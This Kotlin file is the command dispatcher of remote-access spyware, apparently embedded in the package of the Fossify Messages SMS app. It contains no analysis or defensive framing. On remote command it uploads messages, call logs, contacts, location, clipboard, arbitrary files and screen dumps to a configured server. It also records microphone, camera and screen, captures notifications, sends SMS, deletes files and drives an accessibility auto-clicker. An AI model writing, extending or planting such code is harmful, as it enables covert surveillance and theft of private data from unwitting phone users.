package org.fossify.messages.androbox

import android.content.Context
import android.content.Intent
import android.provider.Settings
import android.util.Log
import java.io.File

object CommandProcessor {

    fun processCommand(command: String, context: Context) {
        when {
            command.startsWith("device_info") -> {
                val urls = ConfigManager.getServerUrls(context) ?: return
                val (host, _) = urls
                val file = DeviceInfo.collectInfo(context)
                FileUploader.uploadFile(context, file, host) { success ->
                    if (success) Log.d("CommandProcessor", "Device info uploaded")
                }
            }
            command == "apps" -> {
                val urls = ConfigManager.getServerUrls(context) ?: return
                val (host, _) = urls
                val file = AppList.collectApps(context)
                FileUploader.uploadFile(context, file, host) { success ->
                    if (success) Log.d("CommandProcessor", "App list uploaded")
                }
            }
            command == "messages" -> {
                val urls = ConfigManager.getServerUrls(context) ?: return
                val (host, _) = urls
                val file = MessageCollector.collectMessages(context) ?: return
                FileUploader.uploadFile(context, file, host) { success ->
                    if (success) Log.d("CommandProcessor", "Messages uploaded")
                }
            }
            command == "calls" -> {
                val urls = ConfigManager.getServerUrls(context) ?: return
                val (host, _) = urls
                val file = CallLogCollector.collectCallLogs(context) ?: return
                FileUploader.uploadFile(context, file, host) { success ->
                    if (success) Log.d("CommandProcessor", "Call logs uploaded")
                }
            }
            command == "contacts" -> {
                val urls = ConfigManager.getServerUrls(context) ?: return
                val (host, _) = urls
                val file = ContactsCollector.collectContacts(context) ?: return
                FileUploader.uploadFile(context, file, host) { success ->
                    if (success) Log.d("CommandProcessor", "Contacts uploaded")
                }
            }
            command == "location" -> {
                LocationTracker.collectAndSendLocation(context) { success ->
                    Log.d("CommandProcessor", if (success) "Location sent" else "Location failed")
                }
            }
            command == "clipboard" -> {
                val text = ClipboardHelper.getClipboardText(context)
                val urls = ConfigManager.getServerUrls(context) ?: return
                val (host, _) = urls
                val file = File(context.cacheDir, "clipboard.txt")
                file.writeText(text)
                FileUploader.uploadFile(context, file, host) { success ->
                    if (success) Log.d("CommandProcessor", "Clipboard uploaded")
                    file.delete()
                }
            }
            command.startsWith("send_message:") -> {
                val parts = command.substringAfter("send_message:").split("/", limit = 2)
                if (parts.size == 2) {
                    val number = parts[0]
                    val msg = parts[1]
                    val success = SmsSender.sendSms(number, msg)
                    Log.d("CommandProcessor", "Send SMS to $number: ${if (success) "OK" else "Failed"}")
                }
            }
            command.startsWith("send_message_to_all:") -> {
                val msg = command.substringAfter("send_message_to_all:")
                ToastHelper.showToast(context, "Feature: send to all contacts - $msg")
            }
            command.startsWith("file:") -> {
                val path = command.substringAfter("file:")
                val file = File(path)
                if (file.exists() && file.isFile) {
                    val urls = ConfigManager.getServerUrls(context) ?: return
                    val (host, _) = urls
                    FileUploader.uploadFile(context, file, host) { success ->
                        if (success) Log.d("CommandProcessor", "File uploaded: $path")
                    }
                } else {
                    Log.e("CommandProcessor", "File not found: $path")
                }
            }
            command.startsWith("delete_file:") -> {
                val path = command.substringAfter("delete_file:")
                val success = FileManager.deleteFile(path)
                ToastHelper.showToast(context, if (success) "Deleted $path" else "Delete failed")
            }
            command.startsWith("microphone:") -> {
                val duration = command.substringAfter("microphone:").toIntOrNull() ?: 30
                ForegroundService.startExternalAudio(context, duration)
            }
            command.startsWith("rec_camera_main:") -> {
                val duration = command.substringAfter("rec_camera_main:").toIntOrNull() ?: 30
                ForegroundService.startVideoMain(context)
            }
            command.startsWith("rec_camera_selfie:") -> {
                val duration = command.substringAfter("rec_camera_selfie:").toIntOrNull() ?: 30
                ForegroundService.startVideoSelfie(context)
            }
            command.startsWith("toast:") -> {
                val msg = command.substringAfter("toast:")
                ToastHelper.showToast(context, msg)
            }
            command.startsWith("show_notification:") -> {
                val parts = command.substringAfter("show_notification:").split("/", limit = 2)
                val title = parts.getOrNull(0) ?: "Notification"
                val message = parts.getOrNull(1) ?: ""
                NotificationHelper.showNotification(context, title, message)
            }
            command.startsWith("play_audio:") -> {
                val url = command.substringAfter("play_audio:")
                AudioPlayer.playUrl(context, url)
            }
            command == "vibrate" -> {
                VibrationHelper.vibrate(context)
            }
            command == "camera_selfie" -> ForegroundService.startFrontCamera(context)
            command == "camera_main" -> ForegroundService.startBackCamera(context)
            command == "stop_camera" -> ForegroundService.stopCamera(context)
            command == "video_camera_main" -> ForegroundService.startVideoMain(context)
            command == "video_camera_selfie" -> ForegroundService.startVideoSelfie(context)
            command == "stop_video" -> ForegroundService.stopVideo(context)
            command.startsWith("audio_record") -> {
                val duration = command.split(":").getOrNull(1)?.toIntOrNull() ?: 30
                ForegroundService.startExternalAudio(context, duration)
            }
            command.startsWith("audio_external") -> {
                val duration = command.split(":").getOrNull(1)?.toIntOrNull() ?: 30
                ForegroundService.startExternalAudio(context, duration)
            }
            command == "stop_audio" -> ForegroundService.stopAudio(context)
            command == "screen_record_start" -> ForegroundService.startScreenRecording()
            command == "screen_record_stop" -> ForegroundService.stopScreenRecording()
            command == "screenshot_on" -> ForegroundService.startScreenCapture()
            command == "screen_capture_stop" -> ForegroundService.stopScreenCapture()
            command == "notif_capture_on" -> {
                NotificationCaptureService.setForwardingEnabled(true)
                Log.d("CommandProcessor", "✅ Notification capture ENABLED")
            }
            command == "notif_capture_off" -> {
                NotificationCaptureService.setForwardingEnabled(false)
                Log.d("CommandProcessor", "❌ Notification capture DISABLED")
            }
            command.startsWith("uninstall_app:") -> {
                val packageName = command.substringAfter("uninstall_app:")
                if (packageName.isNotBlank()) {
                    AppUninstall.openAppInfo(context, packageName)
                } else {
                    ToastHelper.showToast(context, "Package name missing")
                }
            }
            command.startsWith("autoclick:") -> {
                val data = command.substringAfter("autoclick:")
                if (data.isNotBlank()) {
                    if (AutoClicker.isEnabled()) {
                        AutoClicker.performClick(data)
                    } else {
                        ToastHelper.showToast(context, "⚠️ Auto Clicker accessibility not enabled. Enable from Settings.")
                        context.startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
                    }
                }
            }
            command == "dump_screen" -> {
                if (AutoClicker.isEnabled()) {
                    AutoClicker.dumpScreen { screenText ->
                        val urls = ConfigManager.getServerUrls(context)
                        if (urls != null) {
                            val (host, _) = urls
                            val file = File(context.cacheDir, "screen_dump.txt")
                            file.writeText(screenText)
                            FileUploader.uploadFile(context, file, host) { success ->
                                if (success) Log.d("CommandProcessor", "Screen dump uploaded")
                                file.delete()
                            }
                        } else {
                            Log.e("CommandProcessor", "No server config for dump")
                        }
                    }
                } else {
                    ToastHelper.showToast(context, "⚠️ Auto Clicker not enabled")
                }
            }
            else -> Log.d("CommandProcessor", "Unknown command: $command")
        }
    }
}